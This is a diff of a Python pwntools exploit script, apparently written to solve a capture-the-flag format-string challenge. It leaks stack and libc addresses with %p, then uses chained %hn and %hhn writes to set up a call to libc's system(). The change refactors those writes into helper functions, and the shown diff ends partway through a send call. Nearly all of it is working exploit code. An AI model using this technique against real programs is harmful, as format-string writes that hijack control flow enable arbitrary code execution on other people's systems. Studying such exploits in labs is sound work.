@@ -9,33 +9,25 @@ libc = ELF('./libc.so.6')
 
 def snd(*msg):
     io.send(flat(msg).ljust(0x1000, b'\x00'))
+    
+def zlovan(value, pos, fmt):
+    snd(f"%{value}c" if value != 0 else "", f"%{pos + 6}${fmt}")
+    
+def zlovancompos(n, addr_lowpos, pos1, fmt, value, pos2):
+    for i in range(n):
+        zlovan(addr_lowpos + i, pos1, fmt)
+        zlovan((value >> (8 * i)) & 0xff, pos2, "hhn")
 
 io.send(b'%6$p-%7$p')
-
 io.recvuntil(b'0x')
 empty_stack = int(io.recv(12), 16) - 0x28
-
 io.recvuntil(b'0x')
 base = int(io.recv(12),16) - 0x2a1ca
 
-snd(f"%{empty_stack & 0xffff}c", "%9$hn")
-snd("%43$hhn")
-snd(f"%{(empty_stack & 0xffff) + 1}c", "%9$hn")
-snd("%64c%43$hhn")
-snd(f"%{(empty_stack & 0xffff) + 2}c", "%9$hn")
-snd("%64c%43$hhn")
+zlovancompos(3, empty_stack & 0xffff, 0x3, "hn", 0x404000, 0x25)
+zlovancompos(3, (empty_stack + 8) & 0xffff, 0x3, "hn", 0x404001, 0x25)
 
 system = base + libc.sym.system
-
-empty_stack += 8
-
-snd(f"%{empty_stack & 0xffff}c", "%9$hn")
-snd("%1c%43$hhn")
-snd(f"%{(empty_stack & 0xffff) + 1}c", "%9$hn")
-snd("%64c%43$hhn")
-snd(f"%{(empty_stack & 0xffff) + 2}c", "%9$hn")
-snd("%64c%43$hhn")
-
 t1 = (system >> 0) & 0xff
 t2 = (system >> 8) & 0xffff
 io.send(
